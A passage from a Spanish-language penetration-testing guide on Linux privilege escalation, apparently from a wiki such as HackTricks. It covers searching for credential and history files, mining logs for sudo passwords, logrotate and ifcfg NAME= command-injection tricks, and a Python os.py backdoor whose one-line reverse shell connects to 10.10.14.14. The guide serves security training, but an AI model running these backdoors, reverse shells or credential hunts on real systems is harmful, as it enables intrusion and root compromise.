find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Archivos de Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml archivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Archivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binarios en PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Archivos web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Copias de seguridad**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Archivos conocidos que contienen passwords

Revisa el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), busca **varios archivos que podrían contener passwords**.\
**Otra herramienta interesante** que puedes usar para ello es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) que es una aplicación de código abierto usada para recuperar muchos passwords almacenados en un equipo local para Windows, Linux & Mac.

### Logs

Si puedes leer logs, puede que encuentres **información interesante/confidencial en ellos**. Cuanto más extraño sea el log, más interesante será (probablemente).\
Además, algunos **bad** configurados (backdoored?) **audit logs** pueden permitirte **registrar passwords** dentro de audit logs como se explica en este post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para leer logs, el grupo [**adm**](interesting-groups-linux-pe/index.html#adm-group) será de gran ayuda.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Debes también buscar archivos que contengan la palabra "**password**" en su **nombre** o dentro del **contenido**, y también comprobar IPs y correos dentro de logs, o hashes regexps.\
No voy a listar aquí cómo hacer todo esto pero si te interesa puedes revisar los últimos chequeos que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Archivos escribibles

### Python library hijacking

Si sabes desde **dónde** se va a ejecutar un script de python y **puedes escribir dentro** de esa carpeta o puedes **modificar python libraries**, puedes modificar la librería OS y backdoor it (si puedes escribir donde se va a ejecutar el script de python, copia y pega la librería os.py).

Para **backdoor the library** simplemente añade al final de la librería os.py la siguiente línea (cambia IP y PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Explotación de logrotate

Una vulnerabilidad en `logrotate` permite que usuarios con **permisos de escritura** sobre un archivo de log o sus directorios padre potencialmente obtengan privilegios elevados. Esto se debe a que `logrotate`, que a menudo se ejecuta como **root**, puede ser manipulado para ejecutar archivos arbitrarios, especialmente en directorios como _**/etc/bash_completion.d/**_. Es importante revisar los permisos no sólo en _/var/log_ sino también en cualquier directorio donde se aplique la rotación de logs.

> [!TIP]
> Esta vulnerabilidad afecta a `logrotate` versión `3.18.0` y anteriores

Más información detallada sobre la vulnerabilidad puede encontrarse en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** así que siempre que encuentres que puedes alterar logs, verifica quién está gestionando esos logs y comprueba si puedes escalar privilegios sustituyendo los logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, por cualquier razón, un usuario es capaz de **escribir** un script `ifcf-<whatever>` en _/etc/sysconfig/network-scripts_ **o** puede **ajustar** uno existente, entonces tu **sistema está pwned**.

Network scripts, _ifcg-eth0_ por ejemplo, se usan para conexiones de red. Se parecen exactamente a archivos .INI. Sin embargo, son \~sourced\~ en Linux por Network Manager (dispatcher.d).

En mi caso, el atributo `NAME=` en estos network scripts no se maneja correctamente. Si tienes **espacios en blanco en el nombre el sistema intenta ejecutar la parte después del espacio en blanco**. Esto significa que **todo lo que esté después del primer espacio en blanco se ejecuta como root**.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Nota el espacio en blanco entre Network y /bin/id_)

### **init, init.d, systemd y rc.d**

El directorio `/etc/init.d` alberga **scripts** para System V init (SysVinit), el **sistema clásico de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart`, y a veces `reload` servicios. Estos pueden ejecutarse directamente o a través de enlaces simbólicos encontrados en `/etc/rc?.d/`. Una ruta alternativa en sistemas Redhat es `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, un **sistema de gestión de servicios** más nuevo introducido por Ubuntu, que usa archivos de configuración para tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts de SysVinit todavía se utilizan junto con las configuraciones de Upstart debido a una capa de compatibilidad en Upstart.

**systemd** surge como un gestor de inicialización y servicios moderno, ofreciendo características avanzadas como el inicio bajo demanda de daemons, gestión de automounts y snapshots del estado del sistema. Organiza archivos en `/usr/lib/systemd/` para paquetes de distribución y `/etc/systemd/system/` para modificaciones del administrador, simplificando el proceso de administración del sistema.

## Otros trucos

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks comúnmente enganchan un syscall para exponer funcionalidad privilegiada del kernel a un manager en userspace. Una autenticación débil del manager (por ejemplo, comprobaciones de firma basadas en FD-order o esquemas de contraseña pobres) puede permitir que una app local se haga pasar por el manager y escale a root en dispositivos ya rootados. Aprende más y detalles de explotación aquí:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

La detección de servicios impulsada por regex en VMware Tools/Aria Operations puede extraer una ruta binaria de las líneas de comando de procesos y ejecutarla con -v bajo un contexto privilegiado. Patrones permisivos (por ejemplo, usando \S) pueden coincidir con listeners colocados por un atacante en ubicaciones escribibles (por ejemplo, /tmp/httpd), llevando a una ejecución como root (CWE-426 Untrusted Search Path).

Aprende más y ve un patrón generalizado aplicable a otros stacks de discovery/monitoring aquí:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades del kernel en Linux y macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acceso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilación de más scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
